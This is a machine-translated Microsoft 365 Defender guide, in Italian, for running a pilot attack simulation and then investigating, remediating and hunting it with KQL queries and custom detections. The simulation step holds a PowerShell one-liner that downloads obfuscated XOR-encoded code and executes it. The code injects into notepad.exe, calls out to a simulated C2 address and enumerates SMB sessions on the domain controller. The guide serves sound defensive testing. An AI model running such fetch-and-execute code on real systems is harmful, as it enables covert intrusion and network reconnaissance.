---
title: Eseguire le simulazioni di Microsoft 365 di attacco di Defender
description: Esegui simulazioni di attacco per il progetto pilota Microsoft 365 Defender per vedere come si svolge e viene rapidamente corretti.
keywords: Microsoft 365 Simulazione di attacco pilota defender, eseguire la simulazione di attacco pilota di Microsoft 365 Defender, simulare l'attacco in Microsoft 365 Defender, progetto pilota di Microsoft 365 Defender, cyber security, minaccia persistente avanzata, sicurezza aziendale, dispositivi, dispositivo, identità, utenti, dati, applicazioni, incidenti, indagini e correzioni automatizzate, ricerca avanzata
search.product: eADQiWindows 10XVcnh
search.appverid: met150
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: dolmont
author: DulceMontemayor
localization_priority: Normal
manager: dansimp
audience: ITPro
ms.collection:
- M365-security-compliance
- m365solution-scenario
- m365solution-pilotmtpproject
ms.topic: conceptual
ms.technology: m365d
ms.openlocfilehash: 767a7ea4c4c7604d1d4b227f08e4ca32c62737c5
ms.sourcegitcommit: a8d8cee7df535a150985d6165afdfddfdf21f622
ms.translationtype: MT
ms.contentlocale: it-IT
ms.lasthandoff: 04/21/2021
ms.locfileid: "51934478"
---
# <a name="run-your-microsoft-365-defender-attack-simulations"></a>Eseguire le simulazioni di Microsoft 365 di attacco di Defender

[!INCLUDE [Microsoft 365 Defender rebranding](../includes/microsoft-defender.md)]


|[![Pianificazione](../../media/phase-diagrams/1-planning.png)](m365d-pilot-plan.md)<br/>[Pianificazione](m365d-pilot-plan.md)|[![Preparazione](../../media/phase-diagrams/2-prepare.png)](prepare-m365d-eval.md)<br/>[Preparazione](prepare-m365d-eval.md)|![Simula attacco](../../media/phase-diagrams/3-simluate.png)<br/>Simula attacco|[![Chiudi e riepiloga](../../media/phase-diagrams/4-summary.png)](m365d-pilot-close.md)<br/>[Chiudi e riepiloga](m365d-pilot-close.md)|
|--|--|--|--|
|||*Sei qui!*||

Si è attualmente in fase di simulazione dell'attacco.

Dopo aver preparato l'ambiente pilota, è il momento di testare le funzionalità di gestione degli incidenti di Microsoft 365 Defender e le funzionalità di analisi e correzione automatizzate. Microsoft ti aiuterà a simulare un attacco sofisticato che sfrutta tecniche avanzate per nasconderti dal rilevamento. L'attacco enumera le sessioni SMB (Server Message Block) aperte nei controller di dominio e recupera gli indirizzi IP recenti dei dispositivi degli utenti. Questa categoria di attacchi in genere non include i file rilasciati nel dispositivo della vittima, ma si verificano esclusivamente in memoria. Usano strumenti di amministrazione e di sistema esistenti e inserisce il codice nei processi di sistema per nasconderne l'esecuzione. Tale comportamento consente loro di evitare il rilevamento e di mantenere il dispositivo.

In questa simulazione, lo scenario di esempio inizia con uno script di PowerShell. Un utente potrebbe essere ingannato nell'esecuzione di uno script. Oppure lo script potrebbe essere eseguito da una connessione remota a un altro computer da un dispositivo in precedenza infetto, ovvero l'utente malintenzionato che tenta di spostarsi lateralmente nella rete. Il rilevamento di questi script può essere difficile perché gli amministratori spesso eseguono anche script in remoto per eseguire diverse attività amministrative.

![Attacco PowerShell senza file con inserimento del processo e diagramma di attacco di ricognizione SMB](../../media/mtp/mtpdiydiagram.png)

Durante la simulazione, l'attacco inserisce shellcode in un processo apparentemente innocenza. Lo scenario richiede l'uso di notepad.exe. Abbiamo scelto questo processo per la simulazione, ma è più probabile che gli utenti malintenzionati si ritorsino a un processo di sistema a esecuzione lunga, ad esempio svchost.exe. Il codice shell passa quindi a contattare il server di comando e controllo (C2) dell'utente malintenzionato per ricevere istruzioni su come procedere. Lo script tenta di eseguire query di ricognizione sul controller di dominio . La ricognizione consente a un utente malintenzionato di ottenere informazioni sulle informazioni di accesso degli utenti recenti. Una volta che gli utenti malintenzionati hanno queste informazioni, possono spostarsi lateralmente nella rete per accedere a un account sensibile specifico

> [!IMPORTANT]
> Per ottenere risultati ottimali, seguire le istruzioni di simulazione degli attacchi il più attentamente possibile.

## <a name="simulation-environment-requirements"></a>Requisiti dell'ambiente di simulazione

Poiché l'ambiente pilota è già stato configurato durante la fase di preparazione, verificare di disporre di due dispositivi per questo scenario: un dispositivo di test e un controller di dominio.

1. Verificare che il tenant [abbia abilitato Microsoft 365 Defender](m365d-enable.md#confirm-that-the-service-is-on).

2. Verificare la configurazione del controller di dominio di test:

   - Il dispositivo viene eseguito con Windows Server 2008 R2 o versione successiva.
   - Controller di dominio di test per [Microsoft Defender per l'identità e](/azure/security-center/security-center-wdatp) abilitare la gestione [remota.](/windows-server/administration/server-manager/configure-remote-management-in-server-manager)
   - Verificare che [Microsoft Defender for Identity e Microsoft Cloud App Security siano](/cloud-app-security/mdi-integration) stati abilitati.
   - Nel dominio viene creato un utente di prova, non sono necessarie autorizzazioni di amministratore.

3. Verificare la configurazione del dispositivo di test:

   1. Il dispositivo viene eseguito Windows 10 versione 1903 o successiva.

   1. Il dispositivo di test è aggiunto al dominio di test.

   1. [Attivare Windows Defender Antivirus](/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features). In caso di problemi durante l'abilitazione Windows Defender Antivirus, vedere questo [argomento per la risoluzione dei problemi.](/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy)

   1. Verificare che il dispositivo di test [sia stato onboarded in Microsoft Defender for Endpoint)](/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints).

Se usi un tenant esistente e implementi i gruppi di dispositivi, crea un gruppo di dispositivi dedicato per il dispositivo di test ed eserciti il push al livello superiore nell'esperienza utente di configurazione.

## <a name="run-the-attack-scenario-simulation"></a>Eseguire la simulazione dello scenario di attacco

Per eseguire la simulazione dello scenario di attacco:

1. Accedere al dispositivo di test con l'account utente di test.

2. Apri una Windows PowerShell nel dispositivo di test.

3. Copiare lo script di simulazione seguente:

   ```powershell
   [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor
   = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI "https://winatpmanagement.windows.com/client/management/static/MTP_Fileless_Recon.txt"
   -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;
   $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
   $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
   ```

   > [!NOTE]
   > Se si apre il documento in un Web browser, è possibile che si verifichino problemi durante la copia del testo completo senza perdere determinati caratteri o introducendo interruzioni di riga aggiuntive. Scarica questo documento e aprilo in Adobe Reader.

4. Al prompt dei comandi, incollare ed eseguire lo script copiato.

> [!NOTE]
> Se si esegue PowerShell con RDP (Remote Desktop Protocol), utilizzare il comando Digita testo Appunti nel client RDP perché il tasto di scelta rapida **CTRL-V** o il metodo di incolla con il pulsante destro del mouse potrebbe non funzionare. Anche le versioni recenti di PowerShell a volte non accettano questo metodo, potrebbe essere necessario prima copiarlo in Blocco note in memoria, copiarlo nella macchina virtuale e quindi incollarlo in PowerShell.

Pochi secondi <i> dopo, </i>notepad.exesi aprirà. Un codice di attacco simulato verrà inserito in notepad.exe. Mantenere aperta l'Blocco note generata automaticamente per sperimentare lo scenario completo.

Il codice di attacco simulato tenterà di comunicare con un indirizzo IP esterno (simulando il server C2) e quindi tenterà la ricognizione con il controller di dominio tramite SMB.

Quando questo script viene completato, verrà visualizzato un messaggio nella console di PowerShell.

```console
ran NetSessionEnum against [DC Name] with return code result 0
```

Per visualizzare la funzionalità Eventi imprevisti e risposte automatizzati in azione, mantenere aperto notepad.exe processo. Vedrai l'arresto automatico degli eventi imprevisti e della risposta Blocco note processo.

## <a name="investigate-an-incident"></a>Analizzare un incidente

> [!NOTE]
> Prima di illustrare questa simulazione, guardare il video seguente per vedere come la gestione degli eventi imprevisti consente di riunire gli avvisi correlati nell'ambito del processo di indagine, dove è possibile trovarlo nel portale e come può essere utile nelle operazioni di sicurezza:

> [!VIDEO https://www.microsoft.com/videoplayer/embed/RE4Bzwz?]

Passando al punto di vista dell'analista SOC, è ora possibile iniziare a analizzare l'attacco nel portale del Centro sicurezza Microsoft 365 sicurezza.

1. Apri la coda [Microsoft 365 eventi imprevisti](https://security.microsoft.com/incidents) del portale del Centro sicurezza da qualsiasi dispositivo.

2. Passare a **Eventi imprevisti** dal menu.

    ![Screenshot degli eventi imprevisti come mostrato nel menu Microsoft 365 a sinistra del Centro sicurezza](../../media/mtp/fig1.png)

3. Il nuovo evento imprevisto per l'attacco simulato verrà visualizzato nella coda degli eventi imprevisti.

    ![Screenshot della coda degli eventi imprevisti](../../media/mtp/fig2.png)

### <a name="investigate-the-attack-as-a-single-incident"></a>Analizzare l'attacco come un singolo evento imprevisto

Microsoft 365 Defender correla l'analisi e aggrega tutti gli avvisi e le indagini correlati da prodotti diversi in un'unica entità evento imprevisto. In questo modo, Microsoft 365 Defender mostra una storia di attacco più ampia, consentendo all'analista SOC di comprendere e rispondere a minacce complesse.

Gli avvisi generati durante questa simulazione sono associati alla stessa minaccia e, di conseguenza, vengono aggregati automaticamente come singolo evento imprevisto.

Per visualizzare l'evento imprevisto:

1. Passare alla **coda Eventi imprevisti.**

   ![Screenshot degli eventi imprevisti dal menu di spostamento](../../media/mtp/fig1.png)

2. Seleziona l'elemento più recente facendo clic sul cerchio a sinistra del nome dell'evento imprevisto. Un pannello laterale visualizza informazioni aggiuntive sull'evento imprevisto, inclusi tutti gli avvisi correlati. Ogni evento imprevisto ha un nome univoco che lo descrive in base agli attributi degli avvisi inclusi.

   ![Screenshot della pagina degli eventi imprevisti in cui gli avvisi generati vengono aggregati durante la simulazione](../../media/mtp/fig4.png)

   Gli avvisi visualizzati nel dashboard possono essere filtrati in base alle risorse del servizio: Microsoft Defender for Identity, Microsoft Cloud App Security, Microsoft Defender for Endpoint, Microsoft 365 Defender e Microsoft Defender per Office 365.

3. Selezionare **Apri pagina evento imprevisto** per ottenere ulteriori informazioni sull'evento imprevisto.

   Nella pagina **Evento** imprevisto è possibile visualizzare tutti gli avvisi e le informazioni relative all'evento imprevisto. Le informazioni includono le entità e gli asset coinvolti nell'avviso, l'origine di rilevamento degli avvisi (Microsoft Defender for Identity, EDR) e il motivo per cui sono stati collegati tra loro. Esaminando l'elenco degli avvisi di eventi imprevisti viene mostrata la progressione dell'attacco. Da questa visualizzazione è possibile visualizzare e analizzare i singoli avvisi.

   È inoltre possibile scegliere **Gestisci evento imprevisto** dal menu a destra per contrassegnare l'evento imprevisto, assegnarlo a se stessi e aggiungere commenti.

   ![Screenshot del punto in cui fare clic su Gestisci evento imprevisto](../../media/mtp/fig5a.png)

   ![Screenshot dei campi nel pannello gestisci eventi imprevisti in cui puoi contrassegnare l'evento imprevisto, assegnarlo a te stesso e aggiungere commenti ](../../media/mtp/fig5b.png)

### <a name="review-generated-alerts"></a>Esaminare gli avvisi generati

Esamini alcuni degli avvisi generati durante l'attacco simulato.

> [!NOTE]
> Verranno visualizzati solo alcuni degli avvisi generati durante l'attacco simulato. A seconda della versione di Windows e dei prodotti Microsoft 365 Defender in esecuzione nel dispositivo di test, è possibile che vengano visualizzati più avvisi in un ordine leggermente diverso.

![Screenshot degli avvisi generati](../../media/mtp/fig6.png)

#### <a name="alert-suspicious-process-injection-observed-source-microsoft-defender-for-endpoint-edr"></a>Avviso: rilevato inserimento di processi sospetti (Origine: Microsoft Defender per endpoint EDR)

Gli autori di attacchi avanzati usano metodi sofisticati e furtivi per mantenere la memoria e nascondersi dagli strumenti di rilevamento. Una tecnica comune consiste nell'operare dall'interno di un processo di sistema attendibile anziché da un eseguibile dannoso, rendendo difficile per gli strumenti di rilevamento e le operazioni di sicurezza individuare il codice dannoso.

Per consentire agli analisti SOC di intercettare questi attacchi avanzati, i sensori di memoria profonda in Microsoft Defender for Endpoint offrono al nostro servizio cloud una visibilità senza precedenti su un'ampia gamma di tecniche di inserimento di codice cross-process. La figura seguente mostra come Defender for Endpoint ha rilevato e avvisato il tentativo di inserire codice per <i>notepad.exe</i>.

![Screenshot dell'avviso per l'inserimento di codice potenzialmente dannoso](../../media/mtp/fig7.png)

#### <a name="alert-unexpected-behavior-observed-by-a-process-run-with-no-command-line-arguments-source-microsoft-defender-for-endpoint-edr"></a>Avviso: comportamento imprevisto osservato da un processo eseguito senza argomenti della riga di comando (Source: Microsoft Defender for Endpoint EDR)

I rilevamenti di Microsoft Defender for Endpoint spesso sono mirati all'attributo più comune di una tecnica di attacco. Questo metodo garantisce la durata e alza l'astio per consentire agli utenti malintenzionati di passare a tattiche più nuove.

Si utilizzano algoritmi di apprendimento su larga scala per stabilire il comportamento normale dei processi comuni all'interno di un'organizzazione e in tutto il mondo e osservare quando questi processi mostrano comportamenti anomali. Questi comportamenti anomali spesso indicano che il codice estraneo è stato introdotto e in esecuzione in un processo altrimenti attendibile.

Per questo scenario, il processo <i>notepad.exe</i> presenta un comportamento anomalo, che implica la comunicazione con una posizione esterna. Questo risultato è indipendente dal metodo specifico utilizzato per introdurre ed eseguire il codice dannoso.

> [!NOTE]
> Poiché questo avviso si basa su modelli di machine learning che richiedono un'ulteriore elaborazione back-end, potrebbe essere necessario del tempo prima di visualizzare questo avviso nel portale.

Si noti che i dettagli dell'avviso includono l'indirizzo IP esterno, un indicatore che è possibile utilizzare come pivot per espandere l'indagine.

Selezionare l'indirizzo IP nell'albero del processo di avviso per visualizzare la pagina dei dettagli dell'indirizzo IP.

![Screenshot dell'avviso per un comportamento imprevisto da parte di un processo eseguito senza argomenti della riga di comando](../../media/mtp/fig8.png)

Nella figura seguente viene visualizzata la pagina dei dettagli dell'indirizzo IP selezionata (facendo clic sull'indirizzo IP nell'albero del processo di avviso).
![Screenshot della pagina dei dettagli dell'indirizzo IP](../../media/mtp/fig9.png)

#### <a name="alert-user-and-ip-address-reconnaissance-smb-source-microsoft-defender-for-identity"></a>Avviso: ricognizione degli indirizzi IP e degli utenti (SMB) (Origine: Microsoft Defender per l'identità)

L'enumerazione tramite il protocollo SMB (Server Message Block) consente agli utenti malintenzionati di ottenere informazioni di accesso utente recenti che consentono loro di spostarsi lateralmente attraverso la rete per accedere a uno specifico account sensibile.

In questo rilevamento, viene attivato un avviso quando l'enumerazione della sessione SMB viene eseguita su un controller di dominio.

![Screenshot of the Microsoft Defender for Identity alert for User and IP address reconnaissance](../../media/mtp/fig10.png)

### <a name="review-the-device-timeline-microsoft-defender-for-endpoint"></a>Esaminare la sequenza temporale del dispositivo [Microsoft Defender per Endpoint]

Dopo aver esaminato i vari avvisi in questo evento imprevisto, tornare alla pagina dell'evento imprevisto analizzata in precedenza. Seleziona la **scheda Dispositivi** nella pagina dell'evento imprevisto per esaminare i dispositivi coinvolti in questo evento, come segnalato da Microsoft Defender per Endpoint e Microsoft Defender per l'identità.

Seleziona il nome del dispositivo in cui è stato condotto l'attacco per aprire la pagina dell'entità per quel dispositivo specifico. In tale pagina è possibile visualizzare gli avvisi attivati e gli eventi correlati.

Seleziona la **scheda Sequenza** temporale per aprire la sequenza temporale del dispositivo e visualizzare tutti gli eventi e i comportamenti osservati nel dispositivo in ordine cronologico, in sequenza con gli avvisi generati.

![Screenshot della sequenza temporale del dispositivo con comportamenti](../../media/mtp/fig11.png)

L'espansione di alcuni dei comportamenti più interessanti fornisce dettagli utili, ad esempio alberi di processo.

Ad esempio, scorrere verso il basso fino a trovare l'evento di avviso **Sospetto inserimento del processo osservato**. Seleziona il **powershell.exe iniettato** per notepad.exe di processo sotto di esso, per visualizzare  l'albero di processo completo per questo comportamento nel grafico Entità evento nel riquadro laterale. Se necessario, utilizzare la barra di ricerca per il filtro.

![Screenshot of the process tree for selected PowerShell file creation behavior](../../media/mtp/fig12.png)

### <a name="review-the-user-information-microsoft-cloud-app-security"></a>Esaminare le informazioni utente [Microsoft Cloud App Security]

Nella pagina dell'evento imprevisto selezionare la **scheda Utenti** per visualizzare l'elenco degli utenti coinvolti nell'attacco. La tabella contiene informazioni aggiuntive su ogni utente, incluso il punteggio Priorità indagine **di ogni** utente.

Selezionare il nome utente per aprire la pagina del profilo dell'utente in cui è possibile eseguire ulteriori indagini. [Altre informazioni sull'analisi degli utenti rischiosi.](/cloud-app-security/tutorial-ueba#identify)

![Screenshot della Cloud App Security utente](../../media/mtp/fig13.png)

## <a name="automated-investigation-and-remediation"></a>Indagine e correzione automatizzate

> [!NOTE]
>Prima di illustrare questa simulazione, guardare il video seguente per acquisire familiarità con ciò che è l'auto-correzione automatica, dove trovarla nel portale e come può essere utile nelle operazioni di sicurezza:

> [!VIDEO https://www.microsoft.com/en-us/videoplayer/embed/RE4BzwB]

Tornare all'evento imprevisto nel portale Microsoft 365 Centro sicurezza. La **scheda Indagini** nella pagina **Evento** imprevisto mostra le indagini automatizzate attivate da Microsoft Defender for Identity e Microsoft Defender for Endpoint. Lo screenshot seguente mostra solo l'indagine automatizzata attivata da Defender per Endpoint. Per impostazione predefinita, Defender per Endpoint consente di correggere automaticamente gli elementi trovati nella coda, che richiedono la correzione.

![Screenshot delle indagini automatizzate relative all'incidente](../../media/mtp/fig14.png)

Seleziona l'avviso che ha attivato un'indagine per aprire la **pagina Dettagli indagine.** Verranno visualizzati i dettagli seguenti:

- Avvisi che hanno attivato l'indagine automatizzata.
- Utenti e dispositivi influenzati. Se vengono trovati indicatori su altri dispositivi, verranno elencati anche questi dispositivi aggiuntivi.
- Elenco di prove. Entità trovate e analizzate, ad esempio file, processi, servizi, driver e indirizzi di rete. Queste entità vengono analizzate per le possibili relazioni con l'avviso e classificate come benigne o dannose.
- Minacce trovate. Minacce note rilevate durante l'indagine.

> [!NOTE]
> A seconda dei tempi, l'indagine automatizzata potrebbe essere ancora in esecuzione. Attendere alcuni minuti per il completamento del processo prima di raccogliere e analizzare le prove ed esaminare i risultati. Aggiorna la **pagina Dettagli indagine** per ottenere i risultati più recenti.

![Screenshot della pagina dei dettagli dell'indagine](../../media/mtp/fig15.png)

Durante l'indagine automatizzata, Microsoft Defender for Endpoint ha identificato il processo di notepad.exe, che è stato iniettato come uno degli artefatti che richiedono la correzione. Defender for Endpoint interrompe automaticamente l'inserimento di processi sospetti nell'ambito della correzione automatica.

È possibile visualizzare <i>notepad.exe</i> dall'elenco dei processi in esecuzione nel dispositivo di test.

## <a name="resolve-the-incident"></a>Risolvere l'evento imprevisto

Al termine dell'indagine e confermata la correzione, chiudere l'evento imprevisto.

Selezionare **Gestisci evento imprevisto.** Impostare lo stato su **Risolvi evento imprevisto** e selezionare la classificazione pertinente.

Quando l'evento imprevisto viene risolto, chiude tutti gli avvisi associati nel Centro sicurezza Microsoft 365 e nei portali correlati.

![Screenshot della pagina degli eventi imprevisti con il pannello Gestisci eventi imprevisti aperto in cui puoi fare clic sull'opzione per risolvere l'evento imprevisto](../../media/mtp/fig16.png)

In questo modo viene incapsulata la simulazione di attacco per la gestione degli incidenti e gli scenari di analisi e correzione automatizzati. La simulazione successiva ti permetterà di eseguire la ricerca proattiva delle minacce per i file potenzialmente dannosi.

## <a name="advanced-hunting-scenario"></a>Scenario di ricerca avanzata

> [!NOTE]
> Prima di illustrare la simulazione, guardare il video seguente per comprendere i concetti avanzati di ricerca, vedere dove è possibile trovarlo nel portale e sapere come può essere utile nelle operazioni di sicurezza:

> [!VIDEO https://www.microsoft.com/videoplayer/embed/RE4Bp7O]

### <a name="hunting-environment-requirements"></a>Requisiti dell'ambiente di ricerca

Per questo scenario è necessaria una singola cassetta postale interna e un dispositivo. Sarà inoltre necessario un account di posta elettronica esterno per inviare il messaggio di prova.

1. Verificare che il tenant abbia [abilitato Microsoft 365 Defender](m365d-enable.md#confirm-that-the-service-is-on).
2. Identificare una cassetta postale di destinazione da utilizzare per la ricezione della posta elettronica.
    a. Questa cassetta postale deve essere monitorata da Microsoft Defender per Office 365 b. Il dispositivo dal requisito 3 deve accedere a questa cassetta postale
3. Configurare un dispositivo di test: a. Assicurati di usare la Windows 10 1903 o versione successiva.
    b. Aggiungere il dispositivo di test al dominio di test.
    c. [Attivare Windows Defender Antivirus](/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features). In caso di problemi durante l'abilitazione Windows Defender Antivirus, vedere [questo argomento per la risoluzione dei problemi.](/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy)
    d. [Onboard to Microsoft Defender for Endpoint](/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints).

### <a name="run-the-simulation"></a>Eseguire la simulazione

1. Da un account di posta elettronica esterno, inviare un messaggio di posta elettronica alla cassetta postale identificata nel passaggio 2 della sezione requisiti dell'ambiente di testing. Includere un allegato che sarà consentito tramite i criteri di filtro della posta elettronica esistenti. Questo file non deve essere dannoso o eseguibile. I tipi di file suggeriti <i>.pdf, </i> <i>.exe</i> (se consentito) o Office documento, ad esempio un file di Word.
2. Aprire il messaggio di posta elettronica inviato dal dispositivo configurato come definito nel passaggio 3 della sezione requisiti dell'ambiente di testing. Aprire l'allegato o salvare il file nel dispositivo.

#### <a name="go-hunting"></a>Andare a caccia

1. Aprire il security.microsoft.com portale.

2. Passare a **Ricerca > ricerca avanzata**.

   ![Screenshot of advanced hunting in the M365 Security Center portal navigation bar](../../media/mtp/fig17.png)

3. Creare una query che inizia raccogliendo eventi di posta elettronica.

   1. Nel riquadro della query selezionare Nuovo.

   1. Fare doppio clic sulla tabella EmailEvents dello schema.

      ```console
      EmailEvents
      ```

   1. Modificare l'intervallo di tempo per le ultime 24 ore. Presupponendo che il messaggio di posta elettronica inviato durante l'esecuzione della simulazione precedente sia stato nelle ultime 24 ore, altrimenti modificare l'intervallo di tempo.

      ![Screenshot in cui è possibile modificare l'intervallo di tempo. Apri il menu a discesa per scegliere tra un intervallo di opzioni per l'intervallo di tempo](../../media/mtp/fig18.png)

   1. Eseguire la query. È possibile ottenere molti risultati a seconda dell'ambiente per il progetto pilota.

      > [!NOTE]
      > Vedere il passaggio successivo per le opzioni di filtro per limitare la restituzione dei dati.

      ![Screenshot dei risultati della query di ricerca avanzata](../../media/mtp/fig19.png)

        > [!NOTE]
        > La ricerca avanzata visualizza i risultati delle query come dati tabulari. È inoltre possibile scegliere di visualizzare i dati in altri tipi di formato, ad esempio grafici.

   1. Esaminare i risultati e verificare se è possibile identificare il messaggio di posta elettronica aperto. La visualizzazione del messaggio nella ricerca avanzata potrebbe richiedere fino a 2 ore. Se l'ambiente di posta elettronica è di grandi dimensioni e sono presenti molti risultati, è possibile utilizzare l'opzione **Mostra** filtri per trovare il messaggio.

      Nell'esempio, il messaggio di posta elettronica è stato inviato da un account Yahoo. Fare clic **+** **sull'icona accanto yahoo.com** nella sezione SenderFromDomain e quindi fare clic su **Applica** per aggiungere il dominio selezionato alla query. Utilizzare il dominio o l'account di posta elettronica utilizzato per inviare il messaggio di prova nel passaggio 1 di Eseguire la simulazione per filtrare i risultati. Eseguire di nuovo la query per ottenere un set di risultati più piccolo per verificare che il messaggio sia visualizzato dalla simulazione.

      ![Screenshot dei filtri. Usa i filtri per restringere la ricerca e trovare ciò che cerchi più velocemente.](../../media/mtp/fig20.png)

      ```console
      EmailEvents
      | where SenderMailFromDomain == "yahoo.com"
      ```

   1. Fare clic nelle righe risultanti della query in modo da poter esaminare il record.

      ![Screenshot del pannello laterale inspect record che si apre quando viene selezionato un risultato di ricerca avanzato](../../media/mtp/fig21.png)

4. Dopo aver verificato che sia possibile visualizzare il messaggio di posta elettronica, aggiungere un filtro per gli allegati. Concentrarsi su tutti i messaggi di posta elettronica con allegati nell'ambiente. Per questo scenario, concentrarsi sui messaggi di posta elettronica in ingresso, non su quelli inviati dall'ambiente. Rimuovere i filtri aggiunti per individuare il messaggio e aggiungere "| dove **AttachmentCount > 0** e **EmailDirection**  ==  **"Inbound""**

   La query seguente mostrerà il risultato con un elenco più breve rispetto alla query iniziale per tutti gli eventi di posta elettronica:

   ```console
   EmailEvents
   | where AttachmentCount > 0 and EmailDirection == "Inbound"
   ```

5. Includere quindi le informazioni sull'allegato (ad esempio: nome file, hash) nel set di risultati. A tale scopo, unire la **tabella EmailAttachmentInfo.** I campi comuni da utilizzare per l'aggiunta, in questo caso **sono NetworkMessageId** **e RecipientObjectId**.

   La query seguente include anche una riga aggiuntiva "| **project-rename EmailTimestamp=Timestamp**" che consente di identificare il timestamp correlato alla posta elettronica e i timestamp correlati alle azioni dei file che verranno aggiunti nel passaggio successivo.

   ```console
   EmailEvents
   | where AttachmentCount > 0 and EmailDirection == "Inbound"
   | project-rename EmailTimestamp=Timestamp
   | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
   ```

6. Usa quindi il **valore SHA256** della tabella **EmailAttachmentInfo** per trovare **DeviceFileEvents** (azioni di file eseguite nell'endpoint) per l'hash. Il campo comune qui sarà l'hash SHA256 per l'allegato.

   La tabella risultante ora include i dettagli dell'endpoint (Microsoft Defender for Endpoint), ad esempio il nome del dispositivo, l'azione eseguita (in questo caso filtrata per includere solo gli eventi FileCreated) e la posizione in cui è stato archiviato il file. Verrà incluso anche il nome dell'account associato al processo.

   ```console
   EmailEvents
   | where AttachmentCount > 0 and EmailDirection == "Inbound"
   | project-rename EmailTimestamp=Timestamp
   | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
   | join DeviceFileEvents on SHA256
   | where ActionType == "FileCreated"
   ```

   A questo punto è stata creata una query che identificherà tutti i messaggi di posta elettronica in ingresso in cui l'utente ha aperto o salvato l'allegato. È inoltre possibile perfezionare questa query in modo da filtrare i domini del mittente specifici, le dimensioni dei file, i tipi di file e così via.

7. Le funzioni sono un tipo speciale di join, che ti consente di estrarre più dati TI su un file come la diffusione, le informazioni sul firmatario e sull'autorità emittente e così via. Per ottenere ulteriori dettagli sul file, utilizzare la **funzione FileProfile():**

    ```console
    EmailEvents
    | where AttachmentCount > 0 and EmailDirection == "Inbound"
    | project-rename EmailTimestamp=Timestamp
    | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
    | join DeviceFileEvents on SHA256
    | where ActionType == "FileCreated"
    | distinct SHA1
    | invoke FileProfile()
    ```

#### <a name="create-a-detection"></a>Creare un rilevamento

Dopo aver creato una query che identifica le  informazioni di cui si desidera ricevere un avviso se si verificano in futuro, è possibile creare un rilevamento personalizzato dalla query.

I rilevamenti personalizzati eseguiranno la query in base alla frequenza impostata e i risultati delle query creeranno avvisi di sicurezza, in base alle risorse selezionate. Tali avvisi saranno correlati agli eventi imprevisti e possono essere valutati come qualsiasi altro avviso di sicurezza generato da uno dei prodotti.

1. Nella pagina della query rimuovere le righe 7 e 8 aggiunte al passaggio 7 delle istruzioni di ricerca Go e fare clic **su Crea regola di rilevamento.**

   ![Screenshot del punto in cui è possibile fare clic su crea regola di rilevamento nella pagina di ricerca avanzata](../../media/mtp/fig22.png)

   > [!NOTE]
   > Se si fa **clic su Crea** regola di rilevamento e si verificano errori di sintassi nella query, la regola di rilevamento non verrà salvata. Verificare che la query non presenti errori.

2. Compilare i campi obbligatori con le informazioni che consentiranno al team di sicurezza di comprendere l'avviso, il motivo per cui è stato generato e le azioni previste.

   ![Screenshot della pagina crea regola di rilevamento in cui è possibile definire i dettagli dell'avviso](../../media/mtp/fig23.png)

   Assicurarsi di compilare i campi con chiarezza per fornire all'utente successivo una decisione informata su questo avviso della regola di rilevamento

3. Selezionare le entità che vengono influenzate in questo avviso. In questo caso, selezionare **Dispositivo** e **cassetta postale**.

   ![Screenshot della pagina crea regola di rilevamento in cui è possibile scegliere i parametri delle entità influenzate](../../media/mtp/fig24.png)

4. Determinare quali azioni devono essere eseguite se l'avviso viene attivato. In questo caso, eseguire un'analisi antivirus, anche se è possibile eseguire altre azioni.

   ![Screenshot della pagina crea regola di rilevamento in cui è possibile eseguire un'analisi antivirus quando viene attivato un avviso per risolvere le minacce](../../media/mtp/fig25.png)

5. Selezionare l'ambito per la regola di avviso. Poiché questa query coinvolge i dispositivi, i gruppi di dispositivi sono rilevanti in questo rilevamento personalizzato in base al contesto di Microsoft Defender for Endpoint. Quando si crea un rilevamento personalizzato che non include i dispositivi come entità influenzate, l'ambito non si applica.

   ![Screenshot of the create detection rule page where you can set the scope for the alert rule manages your expectations for the results that you'll see](../../media/mtp/fig26.png)

   Per questo progetto pilota, è consigliabile limitare questa regola a un sottoinsieme di dispositivi di testing nell'ambiente di produzione.

6. Selezionare **Crea**. Seleziona quindi **Regole di rilevamento personalizzate** nel riquadro di spostamento.

   ![Screenshot dell'opzione Regole di rilevamento personalizzate nel menu](../../media/mtp/fig27a.png)

   ![Screenshot della pagina delle regole di rilevamento che visualizza i dettagli della regola e dell'esecuzione](../../media/mtp/fig27b.png)

   Da questa pagina è possibile selezionare la regola di rilevamento, che aprirà una pagina dei dettagli.

   ![Screenshot of the email attachments page where you can see the status of the rule execution, triggered alerts and actions, edit the detection, and so on](../../media/mtp/fig28.png)

### <a name="additional-advanced-hunting-walk-through-exercises"></a>Ulteriori esercizi di ricerca avanzata

Per ulteriori informazioni sulla ricerca avanzata, i webcast seguenti illustrano le funzionalità di ricerca avanzata all'interno di Microsoft 365 Defender per creare query tra pilastri, eseguire pivot in entità e creare rilevamenti e azioni di correzione personalizzati.

> [!NOTE]
> Prepararsi con il proprio account GitHub per eseguire le query di ricerca nell'ambiente del laboratorio di testing pilota.

|Titolo|Descrizione|Scaricare MP4|Guarda su YouTube|File CSL da utilizzare|
|---|---|---|---|---|
